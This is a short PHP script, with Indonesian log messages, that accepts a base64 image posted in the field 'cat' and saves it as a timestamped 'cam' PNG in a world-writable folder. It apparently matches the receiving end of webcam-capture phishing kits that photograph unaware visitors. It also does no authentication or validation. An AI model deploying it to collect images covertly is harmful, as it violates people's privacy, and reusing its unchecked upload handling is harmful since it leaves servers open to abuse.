<?php
$date = date('dMYHis');
$imageData = $_POST['cat'];

if (!empty($imageData)) {
    $filteredData = substr($imageData, strpos($imageData, ",")+1);
    $unencodedData = base64_decode($filteredData);
    
    $folderPath = 'gambar/';
    if (!file_exists($folderPath)) {
        mkdir($folderPath, 0777, true);
    }
    
    $filePath = $folderPath . 'cam' . $date . '.png';
    $fp = fopen($filePath, 'wb');
    fwrite($fp, $unencodedData);
    fclose($fp);

    error_log("Gambar berhasil disimpan: " . $filePath . "\r\n", 3, "Log.log");
    exit();
} else {
    error_log("Tidak ada data gambar yang diterima." . "\r\n", 3, "Log.log");
}
?>
